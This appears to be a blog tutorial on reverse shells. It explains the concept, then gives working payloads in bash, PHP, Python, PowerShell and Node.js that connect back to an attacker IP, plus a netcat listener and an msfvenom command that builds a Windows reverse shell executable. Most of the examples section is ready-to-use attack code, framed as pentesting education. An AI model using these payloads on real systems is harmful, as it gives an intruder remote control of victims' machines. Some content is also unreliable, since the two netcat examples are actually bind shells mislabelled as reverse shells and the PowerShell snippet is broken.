---
title: Basic Reverse Shell Guide
date: 2025-05-16
lastmod: 2025-05-16
categories:
  - security
tags:
  - reverse shells
  - bash
  - powershell
  - php
  - python
  - node
draft: false
image: /img/banner/tools.png
layout: blog-post
toc: true
---

### Intro

#### What is a Shell

A shell is an interactive display that lets users submit commands to be executed on their computer. These commands are translated into system calls, which are understood and carried out by the operating system. In essence the shell is the direct window into your computer's soul. Any function that can be carried out by your computer can be set into motion through shell commands.

#### What is a Remote Shell

A remote shell allows you to interface with a shell instance on your computer over a network. This can be over LAN through a physical cable, a virtual network or the internet. The most common method of creating a remote shell is through an ssh connection to your computer's IP.

```fish
user=michael
IP=10.0.0.1

ssh $user@$IP
```

This command, and others like it, gives you a remote clone of a shell that is running on the target computer. This function gives users the freedom to connect and work on their computer remotely from any device in the world, with the same freedom they would have if they were physically infront of their device.

However with increased control comes increased risk and vulnerability. If a malicious actor were to gain access to your computer through a remote shell, they would have the same level of control over your computer as you do.

**This** is where reverse shells come into play.  

#### What is a Reverse Shell

Reverse shells are a combination of the two concepts above. A reverse shell is a shell that is first opened on the local computer and then hands off control to a remote computer over the network. The attacker will constantly listen and wait for the reverse shell to send them a signal to connect. To do this the reverse shell has to know the IP address of the remote computer and the port it is listening on. The remote computer then has to be set up to accept incoming connections on that port.

> [!example]Analogy
> If creating a remote shells is like asking to speak to the manager - then a reverse shell is like the manager calling you up because the two of you are friends and he knows you are looking for him.

#### Why use a Reverse Shell

Reverse shells are a common method of gaining access to a computer remotely. They are often used by attackers to gain access to a target system, but they can also be used for legitimate purposes, such as remote administration or troubleshooting. 

Reverse shells are often used in penetration testing and ethical hacking to test the security of a system. They can also be used by system administrators to remotely manage and troubleshoot systems.

### Examples

The following examples will show you how to create a reverse shell using shells and programming languages that are often installed by default on target systems.

#### Listener

```fish
nc -lvnp 8080
```
This command will set up a listener on the attacker's computer on port 8080. 

- The `-l` flag tells netcat to listen for incoming connections
- The `-v` flag enables verbose mode
- The `-n` flag tells netcat not to resolve hostnames
- The `-p` flag specifies the port number to listen on.

This is the most basic step of the reverse shell process. The attacker will set up a listener on their system, waiting for the reverse shell from the target system to connect to them.

#### Bash Reverse Shell

The simples and most common method of creating a reverse shell is using bash. Bash is a command-line shell is the defacto UNIX shell. This method simply uses tcp socket to write and read commands from an attacker's IP. This is often the first method that comes to mind when creating a reverse shell.

```fish
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

This command will create a reverse shell using bash. 
- The `-i` flag tells bash to run in interactive mode
- The `>&` operator redirects both standard output and standard error to the specified IP address and port
- The `0>&1` operator redirects standard input to standard output. 

This command will connect to the specified IP address and port, allowing the attacker to execute commands on the target system.

#### Netcat Reverse Shell

Netcat is a powerful networking utility that can be used to create arbitrary remote connections. It is often pre-installed on Linux and macOS systems, making it a popular choice for attackers.

```fish
nc -l 8080 -e /bin/bash
```
This command will create a reverse shell using netcat.
- The `-l` flag tells netcat to listen for incoming connections on port 8080
- The `-e` flag specifies the program to execute when a connection is made. In this case, it will execute `/bin/bash`, giving the attacker a shell on the target system.
- The attacker can then connect to the target system using the `nc` command and execute commands on the target system.

#### Bash Pipe Reverse Shell

Bash pipes are a common method of creating reverse shells. Just like in the first example they allow you to redirect the output of one command to the input of another command. This can be used to create a reverse shell by redirecting the output of a shell to a netcat network connection.

```fish
mkfifo /tmp/f; nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
This command will create a named pipe using the `mkfifo` command. 

- The `nc` command will listen for incoming connections on port 8080 and redirect the input from the named pipe to the shell. 
- The output from the shell will be redirected to the named pipe, allowing the attacker to execute commands on the target system. 
- Finally, the named pipe is removed using the `rm` command.

#### PHP Reverse Shell

PHP is commonly exploited via webshells - files that are uploaded to a web server and executed by the server. This is a common method of gaining access to a target system, as many web servers have PHP installed by default.

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
This command will create a reverse shell using PHP.
- The `fsockopen` function opens a socket connection to the specified IP address and port
- The `exec` function executes the specified command, in this case, `/bin/sh -i`, which gives the attacker a shell on the target system.
- The `<&3` operator redirects standard input from the socket
- The `>&3` operator redirects standard output to the socket
- The `2>&3` operator redirects standard error to the socket.

This command will connect to the specified IP address and port, allowing the attacker to execute commands on the target system.

#### Python Reverse Shell

Python has increasingly become a popular language running on many systems. In this example we are using creating a socket connection and redirecting the input and output to the socket. The final command runs the same shell as the previous examples.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
``` 

This command will create a reverse shell using Python.
- The `socket` module is used to create a socket connection to the specified IP address and port
- The `subprocess` module is used to execute the specified command, in this case, `/bin/sh -i`, which gives the attacker a shell on the target system.
- The `os.dup2` function redirects standard input, output, and error to the socket
- The `subprocess.call` function executes the specified command, giving the attacker a shell on the target system.

This command will connect to the specified IP address and port, allowing the attacker to execute commands on the target system.

#### Powershell (Windows)

Powershell is a powerful scripting language that is often used for system administration and automation. It is commonly used in Windows environments, making it a popular choice for attackers.

```powershell
$socket=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).$stream = $client.GetStream();

[byte[]]$bt=0..255|%{0};

while(($i=$socket.Read($bt,0,$bt.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
  $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
  $socket.Write($st,0,$st.Length);
  $socket.Flush()
  }
```

- The `New-Object` cmdlet creates a new TCP client and connects to the specified IP address and port
- The `$stream` variable is used to read and write data to the socket
- The `while` loop reads data from the socket and executes it using the `iex` cmdlet
- The output is then sent back to the attacker using the `$socket.Write` method.
- The `Flush` method is used to ensure that all data is sent to the attacker.

#### Node.js (Javascript)

Node.js is a popular JavaScript runtime and can be leveraged to create a reverse shell. This is similar to how Python and PHP are used to create new network connections.

```javascript
// Reverse shell in Node.js
// Connects back to a remote listener and pipes a shell

const net = require("net");
const { spawn } = require("child_process");

// CHANGE THESE VALUES
const REMOTE_HOST = "10.0.0.1";
const REMOTE_PORT = 4444;

const client = new net.Socket();

client.connect(REMOTE_PORT, REMOTE_HOST, () => {
  const sh = spawn("/bin/sh", []);
  client.write("Connected!\n");

  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);

  sh.on("exit", () => {
    client.end();
  });
});

client.on("error", (err) => {
  setTimeout(() => {
    client.connect(REMOTE_PORT, REMOTE_HOST);
  }, 5000); // retry after 5 seconds
});
```
This command will create a reverse shell using Node.js.
- The `net` module is used to create a socket connection to the specified IP address and port
- The `spawn` function is used to execute the specified command, in this case, `/bin/sh`, which gives the attacker a shell on the target system.
- The `client.pipe` method is used to redirect the input and output of the shell to the socket
- The `sh.on("exit")` method is used to close the socket when the shell exits
- The `client.on("error")` method is used to retry the connection if there is an error.

#### MSFVenom
MSFVenom is a powerful tool that can be used to create reverse complex shells programatically. It is part of the Metasploit Framework and can be used to generate payloads for various platforms.

```bash
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.0.0.1 LPORT=8080
```

- The `-p` flag specifies the payload to use, in this case, `windows/x64/shell/reverse_tcp`
- The `-f` flag specifies the format of the output file, in this case, `exe`
- The `-o` flag specifies the output file name, in this case, `shell.exe`
- The `LHOST` and `LPORT` options specify the IP address and port to connect back to.
- The `msfvenom` command will generate a reverse shell executable that can be run on the target system.
- The attacker can then set up a listener using the `msfconsole` command and wait for the reverse shell to connect back to them.

### Additional Resources

There are many resources available online that provide more information about reverse shells and how to use them. Here are a few that I found helpful:

- [TryHackMe - What the Shell](https://tryhackme.com/room/introtoshells)
- [PenTestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [InternetAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet)
- [HackTricks Reverse Shells](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/index.html)

